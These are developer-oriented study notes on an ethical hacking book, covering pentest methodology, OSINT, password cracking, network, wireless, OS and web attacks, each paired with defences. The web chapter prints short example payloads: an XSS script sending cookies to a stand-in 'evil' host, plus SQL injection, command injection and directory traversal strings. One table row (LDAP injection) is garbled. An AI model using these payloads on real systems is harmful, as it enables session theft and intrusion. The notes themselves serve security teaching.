# HACKING FOR DUMMIES, 7th Edition

## A Practical Guide to Ethical Hacking and Penetration Testing

*By Kevin Beaver, CISSP*

# Book Notes — Hacking For Dummies (Developer Focus)

## Chapter 1–2: Mindset and Terminology

### Key Distinction: Vulnerability Testing vs. Penetration Testing

- **Vulnerability testing** — scanning systems to find known weaknesses (automated, broad).
- **Penetration testing** — actively exploiting vulnerabilities to prove real-world impact (manual, targeted).
- **Both are needed** — vulnerability scans find the low-hanging fruit; pentests prove what an attacker can actually do with them.
- Neither replaces the other, and neither replaces a proper security audit (which focuses on policies and processes).

### Attack Categories (What You're Defending Against)

| Category                   | Examples                                                                                |
| -------------------------- | --------------------------------------------------------------------------------------- |
| **Nontechnical**           | Social engineering, physical access, dumpster diving                                    |
| **Network infrastructure** | Port scanning, sniffing, DoS, firewall bypasses, SSL/TLS misconfigurations              |
| **Operating system**       | Missing patches, weak auth, privilege escalation, buffer overflows                      |
| **Application**            | SQL injection, XSS, directory traversal, default credentials, insecure login mechanisms |

### Attacker Motivation Spectrum

- Script kiddies (automated tools, no real understanding) through organized crime (financial) to nation-state actors (espionage). Your security posture must account for the full range, not just the sophisticated end.

---

## Chapter 3–4: Methodology and Planning

### The Testing Process

1. **Define scope and goals** — what systems, what's off-limits, what constitutes success.
2. **Get written authorization** — always. No exceptions.
3. **Gather information** (OSINT, scanning, enumeration).
4. **Identify vulnerabilities** (automated scans + manual analysis).
5. **Exploit** — attempt to gain access, escalate privileges, pivot.
6. **Document and report** — findings, evidence, risk ratings, remediation.
7. **Retest** — verify fixes work.



### Blind vs. Knowledge-Based Testing

| Type                           | Tester Knows                           | Simulates                           |
| ------------------------------ | -------------------------------------- | ----------------------------------- |
| **Black-box (blind)**          | Nothing about the target               | External attacker                   |
| **White-box (full knowledge)** | Architecture, source code, credentials | Insider or post-compromise attacker |
| **Gray-box**                   | Partial info (e.g. user-level access)  | Compromised employee or customer    |

White-box testing finds more vulnerabilities per hour. Black-box testing reveals what an outsider actually sees. Both perspectives matter.

### Testing Timing

- **Don't test during peak hours** on production systems unless you specifically want to test resilience under load.
- **Do test at times attackers would** — nights, weekends, holidays when monitoring is weakest.
- **Schedule DoS tests** during maintenance windows only.

---

## Chapter 5: Information Gathering (OSINT)

### What Attackers Find About You Publicly

- **Social media** — employee names, roles, tech stack mentions, office photos revealing badge systems.
- **Web search** — Google dorking: `site:target.com filetype:pdf`, `intitle:"index of" target.com`, cached pages, error messages.
- **Website crawling** — tools like HTTrack mirror a site for offline analysis; reveals hidden paths, comments in HTML, JS with API endpoints.
- **WHOIS** — domain registrant info, name servers, IP blocks. Even with privacy protection, historical WHOIS (via archive services) often reveals details.
- **DNS enumeration** — zone transfers (`dig axfr`), subdomain brute-forcing, reverse DNS lookups.

### Developer Takeaway

Review what your own organization leaks publicly. Run the same OSINT tools against yourself. Check that error pages don't reveal stack traces, server versions, or internal paths.

---

## Chapter 6: Social Engineering

### Why It Matters for Developers

Social engineering bypasses every technical control you build. The most secure application is irrelevant if someone convinces support to reset the admin password over the phone.

### Core Attack Patterns

- **Pretexting** — creating a fabricated scenario to extract info ("Hi, I'm from IT, I need to verify your credentials for the migration").
- **Phishing** — email-based pretexting, often with malicious links/attachments. Spear phishing targets specific individuals.
- **Tailgating** — following someone through a secured door.
- **Quid pro quo** — offering something (fake tech support) in exchange for access.

### Countermeasures

- Security awareness training (the only real defense — technical controls can't stop a human deciding to trust someone).
- Verification policies for sensitive requests (callback procedures, out-of-band confirmation).
- Classify data so employees know what they can and can't share.

---

## Chapter 8: Passwords

### Technical Password Vulnerabilities

| Vulnerability                                          | Impact                                                      |
| ------------------------------------------------------ | ----------------------------------------------------------- |
| Weak hashing algorithms (MD5, SHA-1 unsalted)          | Crackable in seconds with rainbow tables                    |
| No account lockout                                     | Enables brute-force attacks                                 |
| Passwords stored in plaintext or reversible encryption | Complete exposure on any data breach                        |
| Default credentials left in place                      | Trivial access to systems, databases, admin panels          |
| No MFA                                                 | Single point of failure — one leaked password = full access |

### Cracking Methods

- **Dictionary attacks** — wordlists like `rockyou.txt` against hashes. Effective because most people use common passwords.
- **Brute-force** — trying all combinations. Feasible for short passwords, especially with GPU acceleration.
- **Rainbow tables** — precomputed hash-to-plaintext mappings. Defeated by salted hashes.
- **Credential stuffing** — using leaked username/password pairs from other breaches. Works because people reuse passwords.
- **Pass-the-hash** — using captured NTLM/LM hashes directly for authentication without cracking them (Windows-specific).

### Key Tools

| Tool                | Purpose                                                                   |
| ------------------- | ------------------------------------------------------------------------- |
| **John the Ripper** | Versatile offline password cracker (dictionary, brute-force, rules-based) |
| **Hashcat**         | GPU-accelerated cracking, fastest for large hash sets                     |
| **ophcrack**        | Windows password cracker using rainbow tables                             |
| **Cain & Abel**     | Windows-focused: sniffing, cracking, ARP poisoning                        |
| **THC Hydra**       | Online brute-forcer for network services (SSH, FTP, HTTP, etc.)           |

### Countermeasures for Developers

- **Use bcrypt, scrypt, or Argon2** — adaptive hashing algorithms with built-in salting and configurable work factor.
- **Enforce minimum entropy** — length matters more than complexity rules. 12+ characters.
- **Implement account lockout or rate limiting** — but beware of DoS via intentional lockout of legitimate users. Consider progressive delays instead.
- **Require MFA** — TOTP or WebAuthn/FIDO2 for anything sensitive.
- **Never store plaintext or reversibly encrypted passwords.**
- **Check passwords against breach databases** (e.g. HaveIBeenPwned API) at registration and login.

---

## Chapter 9: Network Infrastructure

### Port Scanning and Enumeration

- **Nmap** is the standard. Key scan types:
  - `nmap -sS target` — SYN scan (stealth, doesn't complete TCP handshake).
  - `nmap -sV target` — version detection (identifies services/versions on open ports).
  - `nmap -O target` — OS fingerprinting.
  - `nmap -A target` — aggressive scan (OS detection + version + scripts + traceroute).
  - `nmap --script vuln target` — runs vulnerability-detection NSE scripts.

### Banner Grabbing

Connecting to an open port and reading the service banner reveals software and version info. Many services (SMTP, FTP, HTTP, SSH) send banners by default.

**Countermeasure:** Suppress or customize banners to hide version info. For HTTP, strip `Server` and `X-Powered-By` headers.

### Common Network Weaknesses

- **SNMP with default community strings** (`public`/`private`) — leaks entire device configuration.
- **Unencrypted management interfaces** — Telnet, HTTP admin panels.
- **SSL/TLS misconfigurations** — expired certs, weak ciphers, SSLv3/TLS 1.0 enabled, missing HSTS.
- **Default credentials on network devices** — routers, switches, firewalls.

### DoS Testing

- Test your systems' resilience, but carefully. Tools like `hping3` can simulate SYN floods. Test against rate limiting, connection limits, and failover mechanisms.
- **Developer angle:** Understand application-layer DoS — slowloris, hash collision attacks, regex DoS (ReDoS), XML bombs. These don't require massive bandwidth.

---

## Chapter 10: Wireless Networks

### Key Wireless Attacks

| Attack                                             | What It Does                                                                              | Countermeasure                                                |
| -------------------------------------------------- | ----------------------------------------------------------------------------------------- | ------------------------------------------------------------- |
| **WEP cracking**                                   | Trivially broken (statistical attack on RC4). Don't use WEP — ever.                       | Use WPA3 or WPA2-Enterprise                                   |
| **WPA/WPA2 handshake capture + dictionary attack** | Capture the 4-way handshake, crack offline                                                | Strong passphrases (20+ chars), WPA3                          |
| **Evil twin / rogue AP**                           | Attacker sets up a fake AP with the same SSID                                             | 802.1X authentication, wireless IDS, client certificates      |
| **WPS PIN brute-force**                            | 8-digit PIN has only \~11,000 combinations due to design flaw                             | Disable WPS entirely                                          |
| **MAC spoofing**                                   | Bypass MAC-based access control                                                           | MAC filtering is not real security; use proper authentication |
| **Deauthentication attacks**                       | Force clients to disconnect and reconnect (to capture handshake or redirect to evil twin) | 802.11w (Management Frame Protection)                         |

### Developer Takeaway

If your application handles sensitive data, never assume the network is secure. Always use TLS end-to-end regardless of whether the user is on WiFi, wired, or cellular.

---

## Chapter 12–13: Operating System Security

### Windows — Key Attack Vectors

- **Null sessions** — anonymous connections to Windows shares (`net use \\target\IPC$ "" /u:""`) can enumerate users, groups, shares, and policies. Disable by restricting anonymous access via Group Policy.
- **NetBIOS/SMB exposure** — ports 135, 137–139, 445. If exposed to the internet, you're inviting exploitation. Block at the firewall.
- **Missing patches** — the #1 Windows vulnerability. Automate patching with WSUS/SCCM.
- **Metasploit** — the go-to exploitation framework. Modules exist for most known Windows vulnerabilities (EternalBlue, PrintNightmare, etc.).

### Linux/macOS — Key Attack Vectors

- **Unnecessary running services** — every open port is an attack surface. Disable what you don't need (`systemctl disable service`).
- **SUID/SGID binaries** — misconfigured SUID root binaries are a classic privilege escalation path. Audit with `find / -perm -4000`.
- **Weak file permissions** — world-writable config files, readable private keys.
- **NFS misconfigurations** — exporting filesystems with `no_root_squash` allows remote root access.
- **.rhosts / hosts.equiv** — legacy trust relationships that bypass authentication entirely. Remove or lock down.
- **Buffer overflows** — still relevant in C/C++ codebases. Use ASLR, stack canaries, and compile with `-fstack-protector`.

### Countermeasures (Both Platforms)

- Enable automatic updates / patch management.
- Run authenticated vulnerability scans (e.g. Nessus with credentials) to find internal weaknesses that external scans miss.
- Harden OS per CIS benchmarks.
- Minimize installed software and running services.
- Enable host-based firewalls.
- Configure proper logging and ship logs to a central SIEM.

---

## Chapter 15: Web Applications (Most Relevant for Developers)

### Directory Traversal

Manipulating file paths to access files outside the intended directory.

```javascript
GET /app/file?name=../../../etc/passwd
```

**Countermeasures:**

- Never use user input directly in file paths.
- Use a whitelist of allowed files or map user input to an index.
- Canonicalize paths and verify they stay within the intended directory.
- Run the web server with minimal filesystem permissions.

### Input-Filtering Attacks (Injection)

| Attack                | Payload Example                                                             | Impact                                                     |                                  |
| --------------------- | --------------------------------------------------------------------------- | ---------------------------------------------------------- | -------------------------------- |
| **SQL Injection**     | `' OR 1=1 --`                                                               | Full database access, data exfiltration, data modification |                                  |
| **XSS (Reflected)**   | `<script>document.location='http://evil/steal?c='+document.cookie</script>` | Session hijacking, credential theft                        |                                  |
| **XSS (Stored)**      | Malicious script saved in DB, rendered to all users                         | Mass compromise of user sessions                           |                                  |
| **Command Injection** | `; cat /etc/passwd`                                                         | OS-level command execution                                 |                                  |
| **LDAP Injection**    | \`*)(uid=*))(                                                               | (uid=\*\`                                                  | Authentication bypass, data leak |

**Countermeasures:**

- **Parameterized queries / prepared statements** — the only reliable defense against SQL injection. ORMs help but don't make you immune (raw queries, HQL injection).
- **Output encoding** — context-aware escaping (HTML, JS, URL, CSS contexts are all different). Use framework-provided escaping.
- **Input validation** — whitelist acceptable characters/patterns. Reject, don't sanitize (sanitization is error-prone).
- **Content Security Policy (CSP)** headers — mitigate XSS impact even if a vulnerability exists.
- **WAF** — web application firewall as a defense-in-depth layer, not a substitute for secure code.

### Unsecured Login Mechanisms

- **Credentials over HTTP** — trivially sniffable. Always TLS.
- **Session tokens in URLs** — visible in logs, referer headers, browser history. Use cookies with `Secure`, `HttpOnly`, `SameSite` flags.
- **Weak session management** — predictable session IDs, no session expiry, no re-authentication for sensitive operations.
- **Missing brute-force protection** on login forms.

### Web Security Testing Tools

| Tool             | Purpose                                                                    |
| ---------------- | -------------------------------------------------------------------------- |
| **Burp Suite**   | Intercepting proxy, scanner, repeater — the standard for web app testing   |
| **OWASP ZAP**    | Free alternative to Burp Suite                                             |
| **Nikto**        | Web server scanner (misconfigurations, dangerous files, outdated software) |
| **SQLMap**       | Automated SQL injection detection and exploitation                         |
| **wfuzz / ffuf** | Fuzzing and directory/parameter brute-forcing                              |

### Source Code Analysis

Automated static analysis (SAST) catches vulnerabilities before deployment. Tools vary by language. Integrate into CI/CD pipeline. Complements dynamic testing (DAST) — neither alone is sufficient.

---

## Chapter 16: Databases and Storage

### Database Security Risks

- **Default credentials** — `sa`/blank on SQL Server, `root`/blank on MySQL, `scott`/`tiger` on Oracle. Always change them.
- **Excessive privileges** — application DB users with DBA-level permissions. Use the principle of least privilege.
- **Unencrypted connections** — database traffic often unencrypted on internal networks. Use TLS for DB connections.
- **SQL injection** — the application layer is the most common path to database compromise.
- **Unpatched database software** — databases are complex software with regular CVEs.

### Storage System Risks

- Sensitive data in network file shares with overly permissive access.
- Credentials, API keys, and PII in plaintext files discoverable by scanning shared drives.
- **Tools like dumpster** and simple `grep`/`findstr` can search network shares for patterns like SSN, credit card numbers, passwords in config files.

### Developer Takeaway

- Use parameterized queries everywhere. No exceptions.
- Application DB accounts should have minimal permissions (no `DROP`, no `GRANT`, read-only where possible).
- Encrypt data at rest and in transit.
- Never commit secrets to version control. Use secrets management (Vault, AWS Secrets Manager, etc.).

---

## Chapter 14: Email and Messaging

### SMTP Attacks Relevant to Developers

- **Open relays** — SMTP servers that accept and forward email from anyone. Used for spam and phishing. Test with `telnet target 25` and try sending to an external address.
- **Email header injection** — if your app sends email with user-controlled input in headers (To, CC, Subject), attackers can inject additional headers to send spam through your server.
- **Banner information disclosure** — SMTP banners reveal MTA software and version.

### Countermeasures

- Configure SMTP authentication and disable open relay.
- Implement SPF, DKIM, and DMARC records to prevent email spoofing of your domain.
- Sanitize any user input used in email headers.
- Strip or customize service banners.

---

## Chapters 17–19: Aftermath — Reporting, Remediation, and Process

### Prioritizing Vulnerabilities

Use a risk-based approach, not just CVSS scores:

**Risk = Likelihood × Impact**

| Factor         | Consider                                                                               |
| -------------- | -------------------------------------------------------------------------------------- |
| **Likelihood** | Exploit availability, attacker skill required, exposure (internet-facing vs. internal) |
| **Impact**     | Data sensitivity, system criticality, regulatory implications, business disruption     |

A medium-severity vulnerability on an internet-facing system with PII may be higher priority than a critical vulnerability on an isolated internal test server.

### Remediation Priorities

1. **Patch management** — automate patching. Track patch status. Have a process for emergency/out-of-band patches.
2. **Hardening** — disable unnecessary services, remove default accounts, apply CIS benchmarks.
3. **Defense in depth** — no single control should be the only thing between an attacker and your data.
4. **Continuous testing** — security is not a one-time event. Automate recurring scans, retest after changes, integrate into CI/CD.

### Building a Security-Aware Development Culture

- Security testing is everyone's responsibility, not just the security team's.
- Developers should understand the attacks their code is vulnerable to.
- Shift-left: integrate SAST, DAST, dependency scanning, and secrets detection into the development pipeline.
- Assume breach: design systems so that a single compromised component doesn't give an attacker everything.

---

## Chapter 22: Ten Deadly Mistakes (Quick Reference)

1. **Not getting written authorization** before testing.
2. **Assuming you'll find everything** — you won't; prioritize and iterate.
3. **Assuming you can eliminate all risk** — you can't; manage it.
4. **Testing only once** — threats and systems change constantly.
5. **Thinking you know it all** — the field evolves rapidly.
6. **Not adopting the attacker's perspective** — defend how they attack, not how you imagine they would.
7. **Not testing the right systems** — test what matters most to the business.
8. **Not using the right tools** — a scanner is not a pentest; a pentest is not a vulnerability assessment.
9. **Hitting production at the wrong time** — coordinate with operations.
10. **Outsourcing and disengaging** — stay involved; you know your systems best.

---

## Key Tools Reference

| Tool                 | Category      | Purpose                                               |
| -------------------- | ------------- | ----------------------------------------------------- |
| **Nmap**             | Network       | Port scanning, service detection, OS fingerprinting   |
| **Nessus / OpenVAS** | Vulnerability | Automated vulnerability scanning                      |
| **Metasploit**       | Exploitation  | Exploit development and execution framework           |
| **Burp Suite**       | Web           | Intercepting proxy, web vulnerability scanner         |
| **OWASP ZAP**        | Web           | Web app security testing (**Burp Suite** alternative) |
| **Wireshark**        | Network       | Packet capture and analysis                           |
| **John the Ripper**  | Passwords     | Offline password cracking                             |
| **Hashcat**          | Passwords     | GPU-accelerated password cracking                     |
| **SQLMap**           | Web/DB        | Automated SQL injection                               |
| **Nikto**            | Web           | Web server misconfiguration scanner                   |
| **Aircrack-ng**      | Wireless      | WiFi security auditing suite                          |
| **Cain & Abel**      | Windows       | Multi-purpose Windows security tool                   |
| **THC Hydra**        | Passwords     | Online brute-force for network services               |
